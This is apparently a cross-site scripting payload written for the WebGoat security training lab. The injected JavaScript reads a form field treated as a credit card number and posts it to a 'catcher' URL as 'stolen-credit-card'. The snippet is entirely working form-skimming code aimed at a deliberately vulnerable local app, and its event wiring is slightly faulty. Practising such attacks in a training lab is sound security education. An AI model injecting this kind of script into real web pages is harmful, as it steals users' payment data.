function logSubmit() {
  var val = document.getElementsByName('form')[0][5].value;
  var xhr=new XMLHttpRequest();
  var url="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="+val;
  xhr.open("POST",url,true);
  xhr.send(null);
}
const form=document.getElementsByName('form')[0][7];
document.getElementsByName('form')[0][6].value = "";
form.addEventListener('SUBMIT',logSubmit());
</script>

